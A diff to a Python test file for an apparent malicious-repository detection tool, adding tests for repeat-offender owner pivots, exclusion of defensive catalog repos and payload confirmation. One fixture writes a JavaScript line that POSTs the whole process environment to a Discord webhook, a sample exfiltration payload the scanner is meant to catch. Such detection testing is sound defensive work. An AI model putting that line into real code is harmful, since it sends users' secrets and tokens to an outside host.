@@ -23,15 +23,16 @@ def _repo(full):
 def test_malicious_repo_owners_from_artifacts_and_findings(tmp_path):
     db = Database.open(tmp_path / "o.sqlite")
     db.start_run("r1", utcnow())
-    db.upsert_artifact(MaliciousArtifact(
-        artifact_type=ArtifactType.REPO, name="evilcorp/dropper", ecosystem="github",
-        source=FeedSource.OPEN_SOURCE_MALWARE,
-        raw_payload={"resource_identifier": "https://github.com/evilcorp/dropper"}), "r1")
+    for name in ("evilcorp/dropper", "evilcorp/loader"):  # repeat offender (>= 2)
+        db.upsert_artifact(MaliciousArtifact(
+            artifact_type=ArtifactType.REPO, name=name, ecosystem="github",
+            source=FeedSource.OPEN_SOURCE_MALWARE,
+            raw_payload={"resource_identifier": f"https://github.com/{name}"}), "r1")
     db.upsert_finding(RepoFinding(full_name="badguy/stealer",
                                   detection_method=DetectionMethod.IOC_SEARCH,
                                   status=RepoFindingStatus.CONFIRMED), "r1")
     owners = db.malicious_repo_owners()
-    assert "evilcorp" in owners      # from OSM repo artifact
+    assert "evilcorp" in owners      # repeat offender from OSM artifacts
     assert "badguy" in owners        # from confirmed finding
     db.close()
 
@@ -80,10 +81,11 @@ class _EnrichClient:
 def test_hunt_owner_pivot_creates_candidates(tmp_path):
     db = Database.open(tmp_path / "h.sqlite")
     db.start_run("seed", utcnow())
-    db.upsert_artifact(MaliciousArtifact(
-        artifact_type=ArtifactType.REPO, name="evilcorp/dropper", ecosystem="github",
-        source=FeedSource.OPEN_SOURCE_MALWARE,
-        raw_payload={"resource_identifier": "https://github.com/evilcorp/dropper"}), "seed")
+    for name in ("evilcorp/dropper", "evilcorp/loader"):  # repeat offender
+        db.upsert_artifact(MaliciousArtifact(
+            artifact_type=ArtifactType.REPO, name=name, ecosystem="github",
+            source=FeedSource.OPEN_SOURCE_MALWARE,
+            raw_payload={"resource_identifier": f"https://github.com/{name}"}), "seed")
 
     hunt(db, _EnrichClient(), TOOLS, run_id="hunt-e", now=utcnow(),
          do_ioc=False, do_lineage=False, do_actor=False, do_enrich=True, do_tier2=False)
@@ -95,4 +97,61 @@ def test_hunt_owner_pivot_creates_candidates(tmp_path):
     assert row is not None  # owner pivot surfaced the malicious owner's other repo
     assert row["detection_method"] == DetectionMethod.MALICIOUS_OWNER.value
     _ = json
+    db.close()
+
+
+def test_malicious_repo_owners_repeat_offenders_only(tmp_path):
+    db = Database.open(tmp_path / "ro.sqlite")
+    db.start_run("r1", utcnow())
+    # victim: one lure repo -> dropped. repeat offender: two -> kept.
+    for owner, name in [
+        ("victim", "interviewtask"), ("badactor", "dropper1"), ("badactor", "dropper2"),
+    ]:
+        db.upsert_artifact(MaliciousArtifact(
+            artifact_type=ArtifactType.REPO, name=f"{owner}/{name}", ecosystem="github",
+            source=FeedSource.OPEN_SOURCE_MALWARE,
+            raw_payload={"resource_identifier": f"https://github.com/{owner}/{name}"}), "r1")
+    owners = db.malicious_repo_owners(min_count=2)
+    assert "badactor" in owners       # >= 2 OSM repos
+    assert "victim" not in owners      # single lure repo -> victim, dropped
+    db.close()
+
+
+def test_is_defensive_repo_excludes_catalogs():
+    from git_warden.scanning import is_defensive_repo
+    assert is_defensive_repo("ossf/malicious-packages")
+    assert is_defensive_repo("opensource-for-freedom/git_warden")
+    assert is_defensive_repo("someone/osv-rss")
+    assert not is_defensive_repo("evilcorp/stealer")
+
+
+def test_intel_candidate_reaches_tier2_without_name_signal(tmp_path):
+    # An owner-pivot repo with a benign NAME still reaches Tier-2 (its discovery
+    # signal is the suspicion) -- and a malicious payload confirms it.
+    db = Database.open(tmp_path / "it.sqlite")
+    db.start_run("seed", utcnow())
+    for i in range(2):  # repeat offender so owner pivot keeps it
+        db.upsert_artifact(MaliciousArtifact(
+            artifact_type=ArtifactType.REPO, name=f"evilcorp/m{i}", ecosystem="github",
+            source=FeedSource.OPEN_SOURCE_MALWARE,
+            raw_payload={"resource_identifier": f"https://github.com/evilcorp/m{i}"}), "seed")
+
+    class C(_EnrichClient):
+        def list_user_repos(self, login, per_page=100):
+            return [_repo("evilcorp/innocent-looking-utils")] if login == "evilcorp" else []
+
+    def clone_mal(full_name, dest, *, runner=None):
+        dest.mkdir(parents=True, exist_ok=True)
+        (dest / "index.js").write_text(
+            "fetch('https://discord.com/api/webhooks/1/x',{method:'POST',"
+            "body:JSON.stringify(process.env)});\n", encoding="utf-8")
+        return dest
+
+    hunt(db, C(), TOOLS, run_id="hunt-it", now=utcnow(),
+         do_ioc=False, do_lineage=False, do_actor=False, do_enrich=True,
+         do_tier2=True, clone=clone_mal)
+    row = db.conn.execute(
+        "SELECT status FROM repo_findings WHERE full_name = ?",
+        ("evilcorp/innocent-looking-utils",)).fetchone()
+    assert row["status"] == "confirmed"  # benign name, but exfil payload confirms
     db.close()
